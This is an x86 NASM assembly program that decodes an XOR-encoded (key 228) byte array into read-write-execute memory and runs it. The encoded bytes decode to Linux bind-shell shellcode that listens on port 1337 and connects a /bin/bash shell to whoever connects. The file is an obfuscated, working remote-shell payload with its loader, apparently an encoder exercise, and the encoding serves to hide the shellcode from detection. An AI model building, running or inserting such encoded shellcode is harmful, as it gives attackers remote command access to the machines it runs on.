;; vim: ft=nasm

global _start

struc mmap_arg
  .suggest: resd 1
  .length:  resd 1
  .perm:    resd 1
  .flags:   resd 1
  .fd:      resd 1
  .file_off:resd 1
  .size:
endstruc

section .text
; text {{{

; _start {{{
_start:
	mov ebp, esp
	sub esp, 4 ;; address allocated by mmap

	sub esp, mmap_arg.size
	mov [esp + mmap_arg.suggest], dword 0
	mov [esp + mmap_arg.length], dword codesize
	mov [esp + mmap_arg.perm], dword 7 ;; rwx
	mov [esp + mmap_arg.flags], dword 0x22 ;; MAP_PRIVATE|MAP_ANONYMOUS
	mov [esp + mmap_arg.fd], dword -1
	mov [esp + mmap_arg.file_off], dword 0
	mov eax, 0x5a
	mov ebx, esp
	int 0x80
	add esp, mmap_arg.size
	mov [ebp-4], eax

	mov ebx, code
	add ebx, codesize
	mov edi, eax
	mov esi, code
.loop:	mov dl, [esi]
	xor dl, 228
	mov [edi], dl
	inc edi
	inc esi
	cmp esi, ebx
	jne .loop

	mov eax, 0x4
	mov ebx, 0x1
	mov ecx, strm
	mov edx, strlen
	int 0x80

	mov eax, [ebp-4]
	call eax

	mov eax, 0x5b
	mov ebx, [ebp-4]
	mov ecx, 15
	int 0x80

	mov eax, 1
	mov ebx, 0
	int 0x80
; }}}

; }}}

section .data
; data {{{
code: db 0x6d, 0x01, 0x67, 0x08, 0xec, 0x82, 0x8c, 0xe1, 0xdd, 0x6d, 0x01, 0x8e, 0xe4, 0x8e, 0xe5, 0x8e, 0xe6, 0x5c, 0x82, 0xe4, 0xe4, 0xe4, 0x5f, 0xe5, 0xe4, 0xe4, 0xe4, 0x6d, 0x05, 0x29, 0x64, 0x6d, 0x26, 0x6d, 0x08, 0x8e, 0xe5, 0x6d, 0x04, 0x8e, 0xe0, 0xb4, 0x8e, 0xe6, 0x8e, 0xe5, 0xb6, 0x5c, 0x82, 0xe4, 0xe4, 0xe4, 0x5f, 0xea, 0xe4, 0xe4, 0xe4, 0x6d, 0x05, 0x29, 0x64, 0x6d, 0x08, 0x67, 0x08, 0xf4, 0x23, 0xa0, 0xc0, 0xe0, 0xe4, 0xe4, 0xe4, 0xe4, 0x82, 0x23, 0xa0, 0xc0, 0xe6, 0xe1, 0xdd, 0x82, 0x23, 0xe0, 0xc0, 0xe6, 0xe4, 0x23, 0xa0, 0xc0, 0xec, 0xe4, 0xe4, 0xe4, 0xe4, 0x23, 0xa0, 0xc0, 0xe8, 0xe4, 0xe4, 0xe4, 0xe4, 0x6d, 0x02, 0x8e, 0xf4, 0xb2, 0xb6, 0x5c, 0x82, 0xe4, 0xe4, 0xe4, 0x5f, 0xe6, 0xe4, 0xe4, 0xe4, 0x6d, 0x05, 0x29, 0x64, 0x6d, 0x08, 0x8e, 0xe4, 0xb6, 0x5c, 0x82, 0xe4, 0xe4, 0xe4, 0x5f, 0xe0, 0xe4, 0xe4, 0xe4, 0x6d, 0x05, 0x29, 0x64, 0x6d, 0x08, 0x8e, 0xe4, 0x8e, 0xe4, 0xb6, 0x5c, 0x82, 0xe4, 0xe4, 0xe4, 0x5f, 0xe1, 0xe4, 0xe4, 0xe4, 0x6d, 0x05, 0x29, 0x64, 0x6d, 0xa1, 0x1c, 0x6d, 0x08, 0x5c, 0xdb, 0xe4, 0xe4, 0xe4, 0x6f, 0xb9, 0x1c, 0x5d, 0xe4, 0xe4, 0xe4, 0xe4, 0x29, 0x64, 0x5c, 0xdb, 0xe4, 0xe4, 0xe4, 0x6f, 0xb9, 0x1c, 0x5d, 0xe5, 0xe4, 0xe4, 0xe4, 0x29, 0x64, 0x5c, 0xdb, 0xe4, 0xe4, 0xe4, 0x6f, 0xb9, 0x1c, 0x5d, 0xe6, 0xe4, 0xe4, 0xe4, 0x29, 0x64, 0x67, 0x08, 0xe8, 0x23, 0xe0, 0xc0, 0xcb, 0x86, 0x8d, 0x8a, 0x23, 0xa0, 0xc0, 0xe0, 0xcb, 0x86, 0x85, 0x97, 0x23, 0xa0, 0xc0, 0xec, 0x8c, 0xe4, 0xe4, 0xe4, 0x5c, 0xef, 0xe4, 0xe4, 0xe4, 0x6d, 0x07, 0x5d, 0xe4, 0xe4, 0xe4, 0xe4, 0x5e, 0xe4, 0xe4, 0xe4, 0xe4, 0x29, 0x64
codesize equ $ - code

strm: db "going in",10
strlen equ $ - strm

; }}}